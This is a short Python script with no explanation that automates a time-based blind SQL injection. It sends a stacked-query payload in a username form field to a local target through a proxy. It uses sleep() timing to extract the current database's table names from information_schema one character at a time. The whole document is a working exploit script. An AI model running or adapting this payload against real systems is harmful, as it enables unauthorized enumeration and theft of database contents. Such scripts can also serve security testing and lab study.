import time, requests, sys

url="http://localhost"
cset = ",abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_+-0123456789"
#cookie={'xxx':'xxx'}
proxy={'http':'http://127.0.0.1:8080'}
s = requests.session()
header={'Content-Type':'application/x-www-form-urlencoded'}
x=1
while 1:
	for i in range(0,len(cset)):
		a=time.time()
		data='username=xxx\';select IF(MID((select group_concat(table_name,0x2C) from information_schema.tables WHERE table_schema=database()),'+str(x)+',1)=\''+cset[i]+'\',sleep(3),1)#'
		r = s.post(url, data=data, proxies=proxy, headers=header)
		b=time.time()
		if float(b-a)>3.0:
			#sys.stdout.flush()
			sys.stdout.write(str(cset[i]))
			sys.stdout.flush()
			break
		else:
			pass
	x+=1
